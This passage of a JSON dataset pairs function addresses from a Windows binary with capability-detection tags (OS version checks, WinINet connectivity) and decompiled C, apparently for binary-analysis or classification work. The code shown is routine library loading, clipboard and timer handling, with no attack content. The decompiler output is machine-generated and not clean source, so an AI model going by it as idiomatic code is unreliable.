            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042ef4c(void)\n\n{\n    uint uVar1;\n    \n    if (*0x497b84 == NULL) {\n        uVar1 = 0x80004001;\n        if (*0x497b70 != 0) {\n            *0x497b84 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42efac);\n            if (*0x497b84 != NULL) {\n                uVar1 = (**0x497b84)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x497b84)();\n    }\n    return uVar1;\n}\n",
        "token_count": 141
    },
    "0042efc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042efc4(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = 0x42efd1;\n    fcn.0042ee44();\n    uStack12 = 0x42f17b;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    if (0 < *0x497b74) {\n        *0x497b74 = *0x497b74 + -1;\n    }\n    puStack8 = &stack0xfffffffc;\n    if ((*0x497b70 != 0) && (puStack8 = &stack0xfffffffc,  *0x497b74 == 0)) {\n        iStack20 = *0x497b70;\n        puStack8 = &stack0xfffffffc;\n        sub.kernel32.dll_FreeLibrary_1();\n        *0x497b70 = 0;\n        *0x497ab0 = 0;\n        *0x497ab4 = 0;\n        *0x497ab8 = 0;\n        *0x497abc = 0;\n        *0x497ac0 = 0;\n        *0x497ac4 = 0;\n        *0x497ac8 = 0;\n        *0x497acc = 0;\n        *0x497ad0 = 0;\n        *0x497ad4 = 0;\n        *0x497ad8 = 0;\n        *0x497adc = 0;\n        *0x497ae0 = 0;\n        *0x497ae4 = 0;\n        *0x497ae8 = 0;\n        *0x497aec = 0;\n        *0x497af0 = 0;\n        *0x497af4 = 0;\n        *0x497af8 = 0;\n        *0x497afc = 0;\n        *0x497b00 = 0;\n        *0x497b04 = 0;\n        *0x497b08 = 0;\n        *0x497b0c = 0;\n        *0x497b10 = 0;\n        *0x497b14 = 0;\n        *0x497b18 = 0;\n        *0x497b1c = 0;\n        *0x497b20 = 0;\n        *0x497b24 = 0;\n        *0x497b28 = 0;\n        *0x497b2c = 0;\n        *0x497b30 = 0;\n        *0x497b34 = 0;\n        *0x497b38 = 0;\n        *0x497b3c = 0;\n        *0x497b40 = 0;\n        *0x497b44 = 0;\n        *0x497b48 = 0;\n        *0x497b4c = 0;\n        *0x497b50 = 0;\n        *0x497b54 = 0;\n        *0x497b58 = 0;\n        *0x497b5c = 0;\n        *0x497b60 = 0;\n        *0x497b64 = 0;\n        *0x497b68 = 0;\n    }\n    *in_FS_OFFSET = iStack20;\n    uStack12 = 0x42f182;\n    iStack16 = 0x42f17a;\n    fcn.0042ee4c();\n    return;\n}\n",
        "token_count": 802
    },
    "0042f184": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0042f184(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffe6c;\n    int32_t iStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x42f198;\n    fcn.0042ee44();\n    uStack20 = 0x42f537;\n    iStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    *0x497b74 = *0x497b74 + 1;\n    puStack16 = &fcn.0042f184::var_1h + 1;\n    if (*0x497b70 == 0) {\n        puStack16 = &fcn.0042f184::var_1h + 1;\n        *0x497b70 = sub.kernel32.dll_LoadLibraryA(0x42f548);\n        if (*0x497b70 != 0) {\n            *0x497ab0 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f554);\n            *0x497ab4 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f564);\n            *0x497ab8 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f574);\n            *0x497abc = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f588);\n            *0x497ac0 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f598);\n            *0x497ac4 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f598);\n            *0x497ac8 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f5b8);\n            *0x497acc = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f5cc);\n            *0x497ad0 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f5e0);\n            *0x497ad4 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f5f4);\n            *0x497ad8 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f610);\n            *0x497adc = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f628);\n            *0x497ae0 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f638);\n            *0x497ae4 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f648);\n            *0x497ae8 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f65c);\n            *0x497aec = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f684);\n            *0x497af0 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f694);\n            *0x497af4 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f6a4);\n            *0x497af8 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f6b4);\n            *0x497afc = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f6c4);\n            *0x497b00 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f6d0);\n            *0x497b04 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f6e4);\n            *0x497b08 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f6f8);\n            *0x497b0c = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f708);\n            *0x497b10 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f718);\n            *0x497b14 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f728);\n            *0x497b18 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f738);\n            *0x497b1c = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f750);\n            *0x497b20 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f760);\n            *0x497b24 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f774);\n            *0x497b28 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f788);\n            *0x497b2c = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f7a0);\n            *0x497b30 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f7b0);\n            *0x497b34 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f7c0);\n            *0x497b38 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f7d0);\n            *0x497b3c = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f7e4);\n            *0x497b40 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f7f4);\n            *0x497b44 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f804);\n            *0x497b48 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f810);\n            *0x497b4c = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f820);\n            *0x497b50 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f83c);\n            *0x497b54 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f858);\n            *0x497b58 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f870);\n            *0x497b5c = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f888);\n            *0x497b60 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f89c);\n            *0x497b64 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f8bc);\n            in_stack_fffffe6c = *0x497b70;\n            *0x497b68 = sub.kernel32.dll_GetProcAddress_1(*0x497b70, 0x42f8d8);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffe6c;\n    fcn.0042ee4c(0x42f53e);\n    return;\n}\n",
        "token_count": 1745
    },
    "0042f8e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042f8e8(void)\n\n{\n    int32_t iVar1;\n    \n    if (((*0x497b70 != 0) && (iVar1 = (**0x497b44)(),  iVar1 != 0)) && (iVar1 = (**0x497b40)(),  iVar1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 89
    },
    "0042f910": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042f910(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42f958;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x497b6c = *0x497b6c + 1;\n    if (*0x497b6c == 0) {\n        while (0 < *0x497b74) {\n            fcn.0042efc4();\n        }\n        fcn.00404650();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 166
    },
    "0042f964": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042f964(void)\n\n{\n    uint uVar1;\n    \n    if (*0x497b90 == NULL) {\n        if (*0x497b8c == 0) {\n            *0x497b8c = sub.kernel32.dll_LoadLibraryA(0x42f9d4);\n        }\n        uVar1 = 0x80004001;\n        if (*0x497b8c != 0) {\n            *0x497b90 = sub.kernel32.dll_GetProcAddress_1(*0x497b8c, 0x42f9e0);\n            if (*0x497b90 != NULL) {\n                uVar1 = (**0x497b90)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x497b90)();\n    }\n    return uVar1;\n}\n",
        "token_count": 185
    },
    "0042fa00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042fa00(void)\n\n{\n    uint uVar1;\n    \n    if (*0x497b94 == NULL) {\n        if (*0x497b8c == 0) {\n            *0x497b8c = sub.kernel32.dll_LoadLibraryA(0x42fa6c);\n        }\n        uVar1 = 0x80004001;\n        if (*0x497b8c != 0) {\n            *0x497b94 = sub.kernel32.dll_GetProcAddress_1(*0x497b8c, 0x42fa78);\n            if (*0x497b94 != NULL) {\n                uVar1 = (**0x497b94)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x497b94)();\n    }\n    return uVar1;\n}\n",
        "token_count": 182
    },
    "0042fa90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t __fastcall fcn.0042fa90(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (5 < **0x492410) {\n        iVar1 = fcn.0042fa00();\n        if ((iVar1 == 0) && (param_1 != 0)) {\n            return CONCAT44(param_1, 1);\n        }\n    }\n    return param_1 << 0x20;\n}\n",
        "token_count": 99
    },
    "0042fab4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042fab4(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42faef;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x497b88 = *0x497b88 + 1;\n    if ((*0x497b88 == 0) && (*0x497b8c != 0)) {\n        iStack20 = *0x497b8c;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 177
    },
    "00430880": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00430880(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x4308d9;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x497b9c = *0x497b9c + 1;\n    if (*0x497b9c == 0) {\n        puVar1 = &stack0xfffffffc;\n        if ((*0x497ba4 != '\\0') && (puVar1 = &stack0xfffffffc,  *0x497ba0 != 0)) {\n            iStack20 = *0x497ba0;\n            sub.kernel32.dll_FreeLibrary_1();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.004060f8();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 250
    },
    "00430af4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00430af4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffcc;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x430b73;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    sub.user32.dll_KillTimer(*(in_EAX + 0x34), 1);\n    if (((*(in_EAX + 0x30) != 0) && (*(in_EAX + 0x40) != '\\0')) && (*(in_EAX + 0x3a) != 0)) {\n        in_stack_ffffffcc = *(in_EAX + 0x34);\n        iVar1 = sub.user32.dll_SetTimer(in_stack_ffffffcc, 1, *(in_EAX + 0x30), 0);\n        if (iVar1 == 0) {\n            fcn.00407550();\n            fcn.0040daec();\n            fcn.00404ec4();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.00405530(0x430b7a);\n    return;\n}\n",
        "token_count": 303
    },
    "00431214": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00431214(void)\n\n{\n    uchar *puVar1;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x431267;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x497bb4 = *0x497bb4 + 1;\n    if (*0x497bb4 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x490334 != 0) {\n            uStack20 = *0x490334;\n            sub.kernel32.dll_GlobalDeleteAtom();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.004060f8();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 219
    },
    "0043134c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043134c(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((in_EAX[1] != 0) && (*(in_EAX + 0xd) == '\\0')) {\n        (**(*in_EAX + 0x10))();\n        *(in_EAX + 0xd) = 1;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "004314f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004314f4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hMem;\n    uint var_4h;\n    \n    uStack20 = 0x431508;\n    (**(*in_EAX + 0x18))();\n    uStack20 = 1;\n    puStack24 = 0x43150f;\n    iVar1 = sub.user32.dll_GetClipboardData();\n    uStack28 = 0x431566;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (iVar1 == 0) {\n        iStack36 = 0x431541;\n        puStack24 = &stack0xfffffffc;\n        fcn.00405530();\n    }\n    else {\n        puStack24 = &stack0xfffffffc;\n        sub.kernel32.dll_GlobalLock();\n        fcn.00405728();\n        iStack36 = iVar1;\n    }\n    *in_FS_OFFSET = iStack36;\n    uStack28 = 0x43156d;\n    if (iVar1 != 0) {\n        iStack32 = iVar1;\n        sub.kernel32.dll_GlobalUnlock();\n    }\n    (**(*in_EAX + 0x14))();\n    return;\n}\n",
        "token_count": 324
    },
    "0043178c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043178c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc8;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_10h;\n    ushort uFormat;\n    uint hMem;\n    int32_t *var_4h;\n    \n    puStack28 = 0x4317a0;\n    var_4h = in_EAX;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x431801;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.0043134c();\n    var_10h = 0;\n    fcn.00427454(&fcn.0043178c::var_10h);\n    sub.user32.dll_SetClipboardData(uFormat, hMem);\n    if (var_10h != 0) {\n        in_stack_ffffffc8 = 9;\n        sub.user32.dll_SetClipboardData(9, var_10h);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    (**(*var_4h + 0x14))(0x431808);\n    return;\n}\n",
        "token_count": 294
    },
    "00431810": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431810(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc8;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_10h;\n    ushort uFormat;\n    uint hMem;\n    int32_t *var_4h;\n    \n    puStack28 = 0x431824;\n    var_4h = in_EAX;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x431885;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.0043134c();\n    var_10h = 0;\n    (**(*param_2 + 0x60))(&fcn.00431810::var_10h);\n    sub.user32.dll_SetClipboardData(uFormat, hMem);\n    if (var_10h != 0) {\n        in_stack_ffffffc8 = 9;\n        sub.user32.dll_SetClipboardData(9, var_10h);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    (**(*var_4h + 0x14))(0x43188c);\n    return;\n}\n",
        "token_count": 309
    },
    "004319ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004319ec(void)\n\n{\n    if (*0x497bc8 == 0) {\n        *0x497bc8 = fcn.00404620();\n    }\n    return *0x497bc8;\n}\n",
        "token_count": 53
    },
    "00431c08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00431c08(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x497bf4 != NULL) {\n        iVar2 = (**0x497bf4)(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x00431c34;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00431c34:\n    return -uVar1;\n}\n",
        "token_count": 151
    },
    "00431c3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00431c3c(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x497bf8 != NULL) {\n        iVar2 = (**0x497bf8)(arg_8h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x00431c5c;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00431c5c:\n    return -uVar1;\n}\n",
        "token_count": 125
    },
    "00432140": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00432140(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if ((in_EAX != 0) && ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        if (*0x497c08 == 0) {\n            *0x497c08 = sub.user32.dll_RegisterWindowMessageA(0x432184);\n        }\n        uVar1 = fcn.00451abc(0);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 == 100;\n    }\n    return uVar1;\n}\n",
        "token_count": 153
    },
    "00432198": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00432198(void)\n\n{\n    if (*0x497c04 == 0) {\n        *0x497c04 = (**(*0x4903a4 + 4))();\n    }\n    return *0x497c04;\n}\n",
        "token_count": 59
    },
    "00432260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00432260(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if ((*(in_EAX + 6) != '\\0') && (*(in_EAX + 8 + (param_2 & 0xff) * 4) == 0)) {\n        uVar1 = (***0x4923c4)(0, *((param_2 & 0x7f) * 4 + 0x4903ac));\n        *(in_EAX + 8 + (param_2 & 0x7f) * 4) = uVar1;\n    }\n    return *(in_EAX + 8 + (param_2 & 0xff) * 4);\n}\n",
        "token_count": 173
    },
    "004322a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004322a0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 5) != '\\0') && (*(in_EAX + 6) != '\\0')) && (*(in_EAX + 4) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 76
    },
    "004323a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004323a0(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch == '\\0') || (arg_10h == 0)) {\n        cVar1 = '\\x01';\n    }\n    else {\n        uVar2 = fcn.00432260(*(arg_10h + 4), *(arg_10h + 8));\n        iVar3 = (***0x49238c)(uVar2);\n        cVar1 = '\\x01' - (iVar3 == 0);\n    }\n    if (cVar1 != '\\0') {\n        (***0x492598)(in_EDX, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "004329d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004329d8(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 6) != '\\0') {\n        fcn.004322cc();\n    }\n    uVar1 = fcn.0042f8e8();\n    *(in_EAX + 6) = uVar1;\n    return;\n}\n",
        "token_count": 85
    },
    "004329f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004329f4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (in_EAX == 0) {\n        return 0;\n    }\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        fcn.00432198();\n        cVar1 = fcn.004322a0();\n        if (cVar1 == '\\0') goto code_r0x00432a11;\ncode_r0x00432a3b:\n        uVar2 = 1;\n    }\n    else {\ncode_r0x00432a11:\n        if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n            fcn.00432198();\n            cVar1 = fcn.004322a0();\n            if ((cVar1 != '\\0') && (cVar1 = fcn.00432140(),  cVar1 == '\\0')) goto code_r0x00432a3b;\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 271
    },
    "00432a40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
